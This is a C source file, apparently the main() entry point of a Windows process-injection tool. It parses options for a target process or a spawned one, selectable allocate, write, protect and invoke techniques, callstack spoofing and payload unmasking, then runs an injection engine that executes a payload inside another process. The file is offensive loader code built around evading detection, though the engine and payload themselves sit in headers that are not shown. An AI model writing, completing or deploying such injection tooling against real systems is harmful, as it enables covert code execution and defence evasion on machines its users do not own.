#include <windows.h>
#include <stdio.h>
#include "engine.h"
#include "payload.h"
#include "cli.h"
#include "dispatch.h"
#include "allocate.h"
#include "write.h"
#include "protect.h"
#include "invoke.h"

int main(int argc, char *argv[]) {
    CLI_OPTIONS opts;
    int rc = parse_cli(argc, argv, &opts);

    if (rc == 1) return 0;   // help printed
    if (rc < 0) return -1;   // error

    // DEBUG BLOCK
    printf("[DEBUG] After parse_cli:\n");
    printf("  spawnPath     = %s\n", opts.ctx.spawnPath ? opts.ctx.spawnPath : "(null)");
    printf("  targetPid     = %lu\n", opts.ctx.targetPid);
    printf("  allocFlavor   = %d (%s)\n", opts.ctx.allocFlavor, flavorName(opts.ctx.allocFlavor));
    printf("  writeFlavor   = %d (%s)\n", opts.ctx.writeFlavor, flavorName(opts.ctx.writeFlavor));
    printf("  protectFlavor = %d (%s)\n", opts.ctx.protectFlavor, flavorName(opts.ctx.protectFlavor));
    printf("  invokeFlavor  = %d (%s)\n", opts.ctx.invokeFlavor, flavorName(opts.ctx.invokeFlavor));

    printf("  spoofCallstack = %s\n", opts.ctx.spoofCallstack ? "TRUE" : "FALSE");
    printf("  csTechnique    = %d\n", opts.ctx.csTechnique);

    //printf("  isPayloadMasked = %s\n", opts.ctx.unmaskPayload ? "TRUE" : "FALSE");
    printf("  unmaskForWrite  = %s\n", opts.ctx.unmaskForWrite ? "TRUE" : "FALSE");
    printf("  unmaskForInvoke = %s\n", opts.ctx.unmaskForInvoke ? "TRUE" : "FALSE");

    //  use default dispatch functions
    INJECTION_ENGINE engine = {
        .Allocate = DispatchAllocate,
        .Write    = DispatchWrite,
        .Protect  = DispatchProtect,
        .Invoke   = DispatchInvoke,
    };

    printf("--- Executing Process Injection ---\n");

    BOOL spawnProcess = (opts.ctx.spawnPath != NULL);

    if(EngineExecute(&engine, &opts.ctx, opts.ctx.payload, PAGE_EXECUTE_READ)) {                    

        printf("[*] Pipeline execution complete.\n");

        if (opts.ctx.hThread) {
            printf("[*] Waiting for payload thread...\n");
            WaitForSingleObject(opts.ctx.hThread, INFINITE);
            CloseHandle(opts.ctx.hThread);

            if (spawnProcess && opts.ctx.hProcess)
                CloseHandle(opts.ctx.hProcess);
        }
    }

    return 0;
}